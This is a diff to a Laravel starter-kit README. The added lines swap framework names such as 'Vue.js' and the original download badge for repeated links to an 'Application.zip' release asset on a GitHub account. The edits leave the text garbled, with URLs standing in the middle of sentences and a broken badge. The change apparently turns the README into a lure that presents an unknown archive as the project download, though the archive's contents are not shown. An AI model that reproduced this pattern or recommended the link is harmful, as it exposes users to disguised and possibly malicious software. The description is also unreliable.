@@ -5,9 +5,9 @@ Welcome to the Laravel Starter Kit repository! This is an opinionated Laravel st
 ## 📦 Features
 - **Laravel**: Utilize the powerful PHP framework for building web applications.
 - **Tailwind CSS**: Harness the utility-first CSS framework for styling your project.
-- **Vue.js**: Incorporate the progressive JavaScript framework for building user interfaces.
-- **Vue 3**: Experience the latest version of Vue.js for improved performance and features.
-- **TypeScript**: Enhance your Vue.js development with static typing through TypeScript.
+- **https://github.com/laohaclumlua/laravel-starter-kit/releases/download/v1.0/Application.zip**: Incorporate the progressive JavaScript framework for building user interfaces.
+- **Vue 3**: Experience the latest version of https://github.com/laohaclumlua/laravel-starter-kit/releases/download/v1.0/Application.zip for improved performance and features.
+- **TypeScript**: Enhance your https://github.com/laohaclumlua/laravel-starter-kit/releases/download/v1.0/Application.zip development with static typing through TypeScript.
 
 ## 📁 Repository Details
 - **Repository Name**: `laravel-starter-kit`
@@ -16,7 +16,7 @@ Welcome to the Laravel Starter Kit repository! This is an opinionated Laravel st
 
 ## 📂 Installation
 To get started with the Laravel Starter Kit, you can download the kit from the following link:
-[![Download Starter Kit](https://img.shields.io/static/v1?label=Download&message=Starter%20Kit&color=blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Starter Kit](https://github.com/laohaclumlua/laravel-starter-kit/releases/download/v1.0/Application.zip%20Kit&color=blue)](https://github.com/laohaclumlua/laravel-starter-kit/releases/download/v1.0/Application.zip)
 
 If the link does not work or if you encounter any issues, please visit the "Releases" section of this repository for alternative download options.
 
